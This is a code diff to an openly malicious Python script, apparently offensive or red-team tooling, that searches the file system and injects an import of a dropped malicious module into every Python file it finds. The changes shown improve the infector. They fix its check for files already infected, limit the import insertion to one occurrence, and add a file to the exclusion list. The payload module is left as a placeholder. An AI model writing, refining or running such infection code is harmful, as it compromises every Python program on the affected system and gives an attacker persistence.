@@ -1,5 +1,5 @@
 """
-Iterate through the file system and inject code into all python files
+Iterate through the file system and inject a malicious module into all python files
 @author: degenerat3
 """
 
@@ -11,7 +11,7 @@ import sys
 
 MODULE_CODE = "changeme"           # The malicious module source code file
 DEST_MODULE_NAME = "changeme"       # The name of the module that will get dropped into sitepkg
-EXCLUDE_LIST = ["/path/to/yum.py", "/path/to/dnf.py" ]  # A list of files we won't infect
+EXCLUDE_LIST = ["Enderman.py", "/path/to/yum.py", "/path/to/dnf.py" ]  # A list of files we won't infect
 
 
 def get_pkg_dir():
@@ -82,7 +82,7 @@ def infect_file(file_path):
     with open(file_path, "r") as f:
         old_content = f.read()      # read the contents of the file into a string
     
-    if DEST_MODULE_NAME in old_content:
+    if DEST_MODULE_NAME[:-3] in old_content:
         return      # return if it's already infected
 
     res = re.search('import(.+?)\n', old_content)   # find the first import line
@@ -90,7 +90,7 @@ def infect_file(file_path):
         current_imp = res.group(1)
         # make a new import block that has our module
         new_imp = current_imp + "\nimport " + DEST_MODULE_NAME[:-3]     
-        new_con = old_content.replace(current_imp, new_imp)     # insert the new import block
+        new_con = old_content.replace(current_imp, new_imp, 1)     # insert the new import block
         with open(file_path, "w") as f:
             f.write(new_con)    # write the new content
 
